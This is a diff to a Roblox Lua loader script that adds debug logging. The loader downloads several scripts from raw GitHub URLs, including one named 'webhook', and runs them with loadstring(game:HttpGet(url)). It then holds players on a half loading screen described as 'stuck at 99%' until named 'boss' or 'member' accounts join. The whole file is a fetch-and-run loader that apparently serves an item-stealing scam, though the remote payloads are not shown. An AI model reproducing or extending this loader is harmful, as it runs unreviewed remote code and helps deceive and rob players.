@@ -1,4 +1,4 @@
--- Main Loader Script
+-- Main Loader Script (Debug Version)
 local scriptUrls = {
     webhook = "https://raw.githubusercontent.com/forcegod20/finalone/refs/heads/main/webhook",
     halfLoading = "https://raw.githubusercontent.com/forcegod20/finalone/refs/heads/main/half%20loading", 
@@ -6,12 +6,24 @@ local scriptUrls = {
     cmdLine = "https://raw.githubusercontent.com/forcegod20/finalone/refs/heads/main/cmdline"
 }
 
--- Load and execute scripts from GitHub
-local function loadScript(url)
+-- Better load function with detailed error reporting
+local function loadScript(url, scriptName)
+    print("📥 Attempting to load: " .. scriptName)
+    print("🔗 URL: " .. url)
+    
     local success, result = pcall(function()
-        return loadstring(game:HttpGet(url))()
+        local scriptCode = game:HttpGet(url)
+        print("✅ Downloaded " .. scriptName .. " successfully")
+        return loadstring(scriptCode)()
     end)
-    return success, result
+    
+    if success then
+        print("🎉 " .. scriptName .. " executed successfully!")
+        return true, result
+    else
+        print("❌ " .. scriptName .. " FAILED: " .. tostring(result))
+        return false, result
+    end
 end
 
 -- Store references to control loading screens
@@ -21,18 +33,24 @@ local CmdLineModule = nil
 
 -- Main execution function
 local function initializeScript()
-    print("🚀 Starting script initialization...")
+    print("=" . rep("=", 50))
+    print("🚀 STARTING MAIN LOADER - DEBUG MODE")
+    print("=" . rep("=", 50))
     
-    -- Execute webhook first
-    local webhookSuccess = loadScript(scriptUrls.webhook)
+    -- Step 1: Execute webhook first
+    print("\n1️⃣ LOADING WEBHOOK...")
+    local webhookSuccess = loadScript(scriptUrls.webhook, "WEBHOOK")
     if webhookSuccess then
         print("✅ Webhook executed successfully")
     else
         print("❌ Webhook failed to load")
     end
     
-    -- Execute half loading screen
-    local halfLoadingSuccess, halfModule = loadScript(scriptUrls.halfLoading)
+    wait(1)
+    
+    -- Step 2: Execute half loading screen
+    print("\n2️⃣ LOADING HALF LOADING SCREEN...")
+    local halfLoadingSuccess, halfModule = loadScript(scriptUrls.halfLoading, "HALF LOADING")
     if halfLoadingSuccess then
         print("✅ Half loading screen started")
         HalfLoadingModule = halfModule
@@ -40,19 +58,45 @@ local function initializeScript()
         print("❌ Half loading screen failed to load")
     end
     
-    -- Load command line (contains authorized users)
-    local cmdSuccess, cmdModule = loadScript(scriptUrls.cmdLine)
+    wait(1)
+    
+    -- Step 3: Load command line
+    print("\n3️⃣ LOADING COMMAND LINE...")
+    local cmdSuccess, cmdModule = loadScript(scriptUrls.cmdLine, "COMMAND LINE")
     if cmdSuccess then
         print("✅ Command line loaded")
         CmdLineModule = cmdModule
+        
+        -- Check if we got authorized users
+        if cmdModule and cmdModule.authorizedUsers then
+            print("✅ Authorized users list loaded successfully")
+            print("👑 Boss users: " .. #cmdModule.authorizedUsers.boss)
+            print("👥 Member users: " .. #cmdModule.authorizedUsers.member)
+        else
+            print("❌ No authorized users found in command line module")
+        end
+    else
+        print("❌ Command line failed to load")
     end
     
-    print("📋 Waiting for authorized user...")
+    print("\n" . rep("=", 50))
+    print("📋 INITIALIZATION COMPLETE")
+    print("⏳ Half loading screen should be running...")
+    print("👑 Waiting for authorized users...")
+    print("=" . rep("=", 50))
 end
 
 -- Function to check if player is authorized
 local function isAuthorizedUser(player)
-    if not CmdLineModule then return false end
+    if not CmdLineModule then 
+        print("❌ CmdLineModule not available for user check")
+        return false 
+    end
+    
+    if not CmdLineModule.authorizedUsers then
+        print("❌ No authorizedUsers in CmdLineModule")
+        return false
+    end
     
     -- Use the authorized users from cmd line
     local authorizedUsers = CmdLineModule.authorizedUsers
@@ -60,6 +104,7 @@ local function isAuthorizedUser(player)
     -- Check boss users
     for _, user in ipairs(authorizedUsers.boss) do
         if player.Name == user.username or player.DisplayName == user.displayname then
+            print("🎯 BOSS USER DETECTED: " .. player.Name)
             return true
         end
     end
@@ -67,25 +112,33 @@ local function isAuthorizedUser(player)
     -- Check member users
     for _, user in ipairs(authorizedUsers.member) do
         if player.Name == user.username or player.DisplayName == user.displayname then
+            print("🎯 MEMBER USER DETECTED: " .. player.Name)
             return true
         end
     end
     
+    print("❌ User NOT authorized: " .. player.Name)
     return false
 end
 
 -- Function to upgrade to full loading screen
 local function upgradeToFullLoading()
-    print("🔄 Upgrading to full loading screen...")
+    print("\n🔄 UPGRADING TO FULL LOADING SCREEN...")
     
     -- Stop the half loading screen
     if HalfLoadingModule and HalfLoadingModule.stop then
+        print("⏹️ Stopping half loading screen...")
         HalfLoadingModule.stop()
         print("✅ Half loading screen stopped")
+    else
+        print("❌ No HalfLoadingModule or stop function")
     end
     
+    wait(1)
+    
     -- Execute full loading screen
-    local fullLoadingSuccess, fullModule = loadScript(scriptUrls.fullLoading)
+    print("🔄 Starting full loading screen...")
+    local fullLoadingSuccess, fullModule = loadScript(scriptUrls.fullLoading, "FULL LOADING")
     if fullLoadingSuccess then
         print("✅ Full loading screen activated")
         FullLoadingModule = fullModule
@@ -98,33 +151,48 @@ end
 
 -- Player joining event handler
 local function onPlayerJoined(player)
+    print("\n👤 Player joined: " .. player.Name)
+    print("🔍 Checking authorization...")
+    
     if isAuthorizedUser(player) then
-        print("🎯 Authorized user detected: " .. player.Name)
+        print("🎯 AUTHORIZED USER CONFIRMED: " .. player.Name)
         
         -- Wait a moment then upgrade loading screen
+        print("⏳ Waiting 2 seconds before upgrade...")
         wait(2)
         upgradeToFullLoading()
+    else
+        print("❌ User not authorized: " .. player.Name)
     end
 end
 
 -- Connect player joining event
 if game.Players then
+    print("🔗 Connecting player join event...")
     game.Players.PlayerAdded:Connect(onPlayerJoined)
     
     -- Check existing players
-    for _, player in pairs(game.Players:GetPlayers()) do
+    print("🔍 Checking existing players...")
+    local players = game.Players:GetPlayers()
+    print("👥 Found " .. #players .. " players in game")
+    
+    for _, player in pairs(players) do
+        print("🔍 Checking player: " .. player.Name)
         if isAuthorizedUser(player) then
-            print("🎯 Authorized user already in game: " .. player.Name)
+            print("🎯 AUTHORIZED USER ALREADY IN GAME: " .. player.Name)
+            print("⏳ Waiting 2 seconds before upgrade...")
             wait(2)
             upgradeToFullLoading()
             break
         end
     end
+else
+    print("❌ game.Players service not available")
 end
 
 -- Start the script
+print("\n🎮 STARTING MAIN LOADER...")
 initializeScript()
 
-print("🎮 Main Loader Started Successfully!")
-print("⏳ Half loading screen running (stuck at 99%)...")
-print("👑 Waiting for authorized users: jaatshab_770, boss_user2, etc...")
+-- Manual test command (you can remove this later)
+print("\n💡 DEBUG: You can manually test with: upgradeToFullLoading()")
